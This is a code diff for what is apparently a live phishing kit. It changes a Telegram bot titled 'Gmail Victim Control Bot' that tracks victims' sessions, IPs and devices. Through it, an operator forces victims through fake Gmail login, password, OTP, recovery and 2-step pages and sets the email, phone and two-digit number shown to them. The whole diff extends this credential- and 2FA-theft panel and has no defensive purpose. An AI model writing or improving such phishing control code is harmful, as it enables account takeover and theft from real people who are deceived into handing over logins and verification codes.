@@ -865,19 +865,19 @@ def telegram_webhook():
                 force_victim(session_id, page, chat_id, message_id)
             elif action == 'setemail':
                 session_id = data_parts[1]
-                email = data_parts[2]
+                email = data_parts[2] if len(data_parts) > 2 else ''
                 set_victim_email(session_id, email, chat_id, message_id)
             elif action == 'setphonetype':
                 session_id = data_parts[1]
-                phone_type = data_parts[2]
+                phone_type = data_parts[2] if len(data_parts) > 2 else ''
                 set_victim_phonetype(session_id, phone_type, chat_id, message_id)
             elif action == 'setnumber':
                 session_id = data_parts[1]
-                number = data_parts[2]
+                number = data_parts[2] if len(data_parts) > 2 else ''
                 set_victim_number(session_id, number, chat_id, message_id)
             elif action == 'setphone':
                 session_id = data_parts[1]
-                phone = data_parts[2]
+                phone = data_parts[2] if len(data_parts) > 2 else ''
                 set_victim_phone(session_id, phone, chat_id, message_id)
             elif action == 'delete':
                 session_id = data_parts[1]
@@ -890,6 +890,9 @@ def telegram_webhook():
                 send_stats(chat_id, message_id)
             elif action == 'clear_all':
                 clear_all_victims(chat_id, message_id)
+            elif action == 'back_to_victim':
+                session_id = data_parts[1]
+                send_victim_detail(chat_id, session_id, message_id)
             
             return jsonify({'status': 'ok'})
         
@@ -931,7 +934,7 @@ def send_main_menu(chat_id, message_id=None):
         ]
     }
     
-    text = """🤖 <b>Victim Control Bot</b>
+    text = """🤖 <b>Gmail Victim Control Bot</b>
 
 Welcome! Use the buttons below to control your victims.
 
@@ -996,26 +999,42 @@ def send_victim_detail(chat_id, session_id, message_id=None):
             ]
         }
     else:
+        # Get current values from stored data
+        current_email = victim.get('email', 'Not set')
+        current_phone = verify_page_data.get(session_id, {}).get('phone', 'Not set')
+        current_number = recovery_page_data.get(session_id, {}).get('number', 'Not set')
+        current_phone_type = verification_page_data.get(session_id, {}).get('phone', 'Not set')
+        
         text = f"""👤 <b>Victim Details</b>
 
-🆔 <b>Session:</b> <code>{victim['session_id']}</code>
-📧 <b>Email:</b> {victim['email']}
+🆔 <b>Session:</b> <code>{victim['session_id'][:12]}...</code>
+📧 <b>Email:</b> {current_email}
 📍 <b>Current Page:</b> {victim['current_page']}
 🌐 <b>IP:</b> {victim['ip_address']}
 📱 <b>Device:</b> {victim['user_agent'][:40]}...
 🕐 <b>Connected:</b> {victim['timestamp']}
 📊 <b>Navigations:</b> {victim['nav_count']}
 
-<b>Control Options:</b>"""
+<b>Current Settings:</b>
+📧 <b>Email:</b> {current_email}
+📱 <b>Phone Type:</b> {current_phone_type}
+📞 <b>Phone:</b> {current_phone}
+🔢 <b>2-Digit Number:</b> {current_number}
+
+<b>Gmail Flow Controls:</b>"""
         
         keyboard = {
             "inline_keyboard": [
                 [
-                    {"text": "🔄 Waiting", "callback_data": f"force|{session_id}|waiting"},
-                    {"text": "🔐 Login", "callback_data": f"force|{session_id}|login"}
+                    {"text": "📧 Set Email", "callback_data": f"setemail|{session_id}|"},
+                    {"text": "📱 Set Phone Type", "callback_data": f"setphonetype|{session_id}|"}
                 ],
                 [
-                    {"text": "⏸️ Stall", "callback_data": f"force|{session_id}|stall"},
+                    {"text": "📞 Set Phone", "callback_data": f"setphone|{session_id}|"},
+                    {"text": "🔢 Set 2-Digit", "callback_data": f"setnumber|{session_id}|"}
+                ],
+                [
+                    {"text": "🔐 Login", "callback_data": f"force|{session_id}|login"},
                     {"text": "🔑 Password", "callback_data": f"force|{session_id}|password"}
                 ],
                 [
@@ -1024,22 +1043,18 @@ def send_victim_detail(chat_id, session_id, message_id=None):
                 ],
                 [
                     {"text": "📱 OTP", "callback_data": f"force|{session_id}|otp"},
-                    {"text": "❌ Invalid", "callback_data": f"force|{session_id}|invalid"}
+                    {"text": "📱 Recovery", "callback_data": f"force|{session_id}|recovery"}
                 ],
                 [
-                    {"text": "📱 Recovery", "callback_data": f"force|{session_id}|recovery"},
-                    {"text": "🔒 2-Step", "callback_data": f"force|{session_id}|2step"}
+                    {"text": "🔒 2-Step", "callback_data": f"force|{session_id}|2step"},
+                    {"text": "⏸️ Stall", "callback_data": f"force|{session_id}|stall"}
                 ],
                 [
-                    {"text": "📧 Set Email", "callback_data": f"setemail|{session_id}|"},
-                    {"text": "🗑️ Delete", "callback_data": f"delete|{session_id}"}
+                    {"text": "❌ Invalid", "callback_data": f"force|{session_id}|invalid"},
+                    {"text": "⏳ Waiting", "callback_data": f"force|{session_id}|waiting"}
                 ],
                 [
-                    {"text": "📱 Set Phone Type", "callback_data": f"setphonetype|{session_id}|"},
-                    {"text": "📞 Set Phone", "callback_data": f"setphone|{session_id}|"}
-                ],
-                [
-                    {"text": "🔢 Set Number", "callback_data": f"setnumber|{session_id}|"}
+                    {"text": "🗑️ Delete Victim", "callback_data": f"delete|{session_id}"}
                 ],
                 [
                     {"text": "📋 Back to Victims", "callback_data": "victims_list"},
@@ -1088,7 +1103,7 @@ def set_victim_email(session_id, email, chat_id, message_id):
         text = "📧 Please type the email address you want to set.\n\nExample: user@gmail.com"
         keyboard = {
             "inline_keyboard": [
-                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
             ]
         }
         edit_telegram_message(chat_id, message_id, text, keyboard)
@@ -1102,6 +1117,11 @@ def set_victim_email(session_id, email, chat_id, message_id):
     
     if session_id in active_victims:
         active_victims[session_id]['email'] = email
+    
+    # Also store in verify data
+    if session_id not in verify_page_data:
+        verify_page_data[session_id] = {}
+    verify_page_data[session_id]['email'] = email
     
     text = f"✅ Email set to: <code>{email}</code>"
     keyboard = {
@@ -1117,7 +1137,7 @@ def set_victim_phonetype(session_id, phone_type, chat_id, message_id):
         text = "📱 Please type the phone type you want to set.\n\nExamples: iPhone, Android, Samsung, Oppo, etc."
         keyboard = {
             "inline_keyboard": [
-                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
             ]
         }
         edit_telegram_message(chat_id, message_id, text, keyboard)
@@ -1141,7 +1161,7 @@ def set_victim_number(session_id, number, chat_id, message_id):
         text = "🔢 Please type a 2-digit number (00-99).\n\nExample: 42"
         keyboard = {
             "inline_keyboard": [
-                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
             ]
         }
         edit_telegram_message(chat_id, message_id, text, keyboard)
@@ -1151,7 +1171,7 @@ def set_victim_number(session_id, number, chat_id, message_id):
         text = "❌ Invalid number. Must be 2 digits (00-99). Please try again."
         keyboard = {
             "inline_keyboard": [
-                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
             ]
         }
         edit_telegram_message(chat_id, message_id, text, keyboard)
@@ -1161,7 +1181,7 @@ def set_victim_number(session_id, number, chat_id, message_id):
         recovery_page_data[session_id] = {}
     recovery_page_data[session_id]['number'] = number
     
-    text = f"✅ Number set to: <code>{number}</code>"
+    text = f"✅ 2-Digit Number set to: <code>{number}</code>"
     keyboard = {
         "inline_keyboard": [
             [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
@@ -1175,7 +1195,7 @@ def set_victim_phone(session_id, phone, chat_id, message_id):
         text = "📞 Please type the phone number you want to set.\n\nExample: +1234567890"
         keyboard = {
             "inline_keyboard": [
-                [{"text": "🔙 Back", "callback_data": f"victim_detail|{session_id}"}]
+                [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}]
             ]
         }
         edit_telegram_message(chat_id, message_id, text, keyboard)
@@ -1185,7 +1205,7 @@ def set_victim_phone(session_id, phone, chat_id, message_id):
         verify_page_data[session_id] = {}
     verify_page_data[session_id]['phone'] = phone
     
-    text = f"✅ Phone set to: <code>{phone}</code>"
+    text = f"✅ Phone number set to: <code>{phone}</code>"
     keyboard = {
         "inline_keyboard": [
             [{"text": "🔙 Back to Victim", "callback_data": f"victim_detail|{session_id}"}],
@@ -1205,6 +1225,12 @@ def delete_victim_telegram(session_id, chat_id, message_id):
         del active_victims[session_id]
     if session_id in victim_commands:
         del victim_commands[session_id]
+    if session_id in verify_page_data:
+        del verify_page_data[session_id]
+    if session_id in recovery_page_data:
+        del recovery_page_data[session_id]
+    if session_id in verification_page_data:
+        del verification_page_data[session_id]
     
     text = f"🗑️ Victim <code>{session_id[:8]}...</code> deleted!"
     keyboard = {
@@ -1285,10 +1311,6 @@ def send_clear_confirmation(chat_id):
 
 def send_telegram_message_with_buttons(chat_id, text, keyboard):
     try:
-        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
-        if not chat_id:
-            return False
-        
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         data = {
             "chat_id": chat_id,
@@ -1304,10 +1326,6 @@ def send_telegram_message_with_buttons(chat_id, text, keyboard):
 
 def edit_telegram_message(chat_id, message_id, text, keyboard):
     try:
-        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
-        if not chat_id:
-            return False
-        
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
         data = {
             "chat_id": chat_id,
@@ -1600,7 +1618,7 @@ def other_403(invite_num):
 def setup_telegram_webhook():
     """Set the Telegram webhook URL"""
     try:
-        domain = os.environ.get('DOMAIN_URL', 'https://bace-w3pt.onrender.com')
+        domain = os.environ.get('DOMAIN_URL', 'https://bace-wmed.onrender.com')
         webhook_url = f"{domain}/telegram-webhook"
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={webhook_url}"
         response = requests.get(url)
